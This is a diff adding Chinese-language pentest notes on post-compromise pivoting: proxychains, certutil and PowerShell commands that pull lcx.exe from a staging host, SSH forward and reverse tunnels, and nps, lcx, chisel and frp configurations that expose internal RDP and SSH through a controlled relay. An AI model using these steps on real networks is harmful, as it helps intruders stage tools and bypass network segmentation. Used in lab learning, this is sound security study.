@@ -1,0 +1,135 @@
+设置命令代理（proxychains）
+	vi /etc/proxychains4.conf
+
+		[ProxyList]
+		socks5 192.168.184.60 1080
+
+	proxychains ssh root@10.10.10.101				（运行命令时将通过代理转发）
+	proxychains rdesktop 10.10.10.100:3389
+
+
+
+Windows命令下载文件
+	powershell
+		powershell(new-object System.Net.WebClient).DownloadFile('http://192.168.184.150/lcx.exe','c:\lcx.exe')
+	certutil
+		certutil -urlcache -split -f http://192.168.184.150/lcx.exe
+		certutil -urlcache -split -f http://192.168.184.150/lcx.exe my.exe 			#指定保存文件名
+
+
+
+Linux下载文件
+	wget
+		wget http://192.168.184.150/lcx.exe
+	xlax（多线程下载）
+		xlax http://192.168.184.150/lcx.exe
+		xlax -n 10 http://192.168.184.150/lcx.exe
+	curl
+		curl -O http://192.168.184.150/lcx.exe
+	aria2c（apt install aria2）
+		aria2c http://192.168.184.150/lcx.exe
+		
+
+
+
+
+
+2-1
+
+
+ssh / autossh（-p 指定端口，-C 允许压缩数据，-N 不执行远程指令，-L 使用本地端口转发，-R 使用转成端口转发，-f 后台执行，-D 指定动态端口转发 1080是标准的SOCKS 端口）（格式：ssh -NL/R ip1:port:ip2:port user@ip3）
+													用于本机				用于远程主机
+	正向转发（A	 B	C）
+			150   60   70
+	ssh -NL 0.0.0.0:6000:192.168.184.70:80 root@192.168.184.60				（以 60 为中介，将 150 / 60 下的 6000 端口转发志 70 的 80 端口）		-L	->	0.0.0.0
+																	（在 B 上执行，本地端口映射到其他机器）
+																	（在 A 上执行，本地端口通过跳板映射到其他机器）
+	ssh -NL 0.0.0.0:6000:192.168.184.70:80 192.168.184.60	（0.0.0.0 表示所有网卡）
+
+
+	反向端口转发（A	 B	|C|	 D	E）
+				150	200	NAT	 13   15
+				  公网		  内网
+	ssh -NR 0.0.0.0:18000:10.10.10.13:3389 192.168.184.200					（ B 获取了 E 的控制权，通过 E 为中介将 200 的 18000 端口映射到 内网13 的 3389 端口）（kali_A 远程连接 rdesktop 192.168.184.200:18000）
+	ssh -NR 10022:127.0.0.1:22 192.168.184.200							（ B 执行 ssh 127.0.0.1 -p 10022）
+
+
+
+
+
+2-2
+
+
+nps
+
+	tar -zxvf linux_amd64_server.tar.gz					（解压文件）
+	./nps install										（安装nps）
+	vi /etc/nps/conf/nps.conf							（修改配置文件：bridge_port=9024，web_port = 9080：客户端连接端口，网页管理端口，web_username=admin，web_password=123：用户名，密码
+	nps start											（启用nps服务）
+	./npc -server=192.168.184.60:9024 -vkey=******************** -type=tcp			（在网页中新建客户端，并在客户端运行命令连接）
+	通过网页建立socks、TCP、UDP、HTTP隧道（注意客户端ID）
+
+
+
+
+
+2-3
+
+
+LCX
+
+	./lcx -listen 4000 8000								（在 4000 端口开启服务，8000 端口开启监听等待连接）
+	./lcx -slave 192.168.184.60 8000 127.0.0.1 3389			（连接服务器的 8000 端口到本机的 3389 端口）
+	./lcx -tran 4003 10.10.30.100 3389					（在本地 4003 端口开启服务，定向到目标机器的 3389 端口）
+
+
+
+
+
+chisel
+
+	./chisel server -p 6000 --reverse										（在本地开启 6000 端口监听）
+	./chisel client -v 192.168.184.60:6000 R:0.0.0.0:7000:10.10.10.100:3389		（客户端连接服务器 6000 端口，并将服务器 7000 端口定向到目标机 3389 端口）
+
+
+
+
+
+frp
+
+	tar -zxvf frp_0.42.0_linux_amd64.tar.gz
+
+	[配置服务端]
+	vim frps.ini
+		[common]
+		bind_port = 7000					（服务器监听端口）
+		dashboard_port = 7500			（网页管理端口）
+		token = ********					（密钥）
+		dashboard_user = admin			（网页管理用户）
+		dashboard_pwd = admin			（网页管理密码）
+
+	./frps -c frps.ini						（启用服务）
+
+	[配置客户端]
+	vim frpc.ini
+		[common]
+		server_addr = 192.168.184.60
+		server_port = 7000
+		token = ********
+
+		[ssh]
+		type = tcp
+		local_ip = 127.0.0.1
+		local_port = 22
+		remote_port = 7001
+		[30.100]
+		type = tcp
+		local_ip = 10.10.30.100
+		local_port = 3389
+		remote_port = 7001
+
+	./frpc -c frpc.ini						（连接服务器）
+
+
+
+
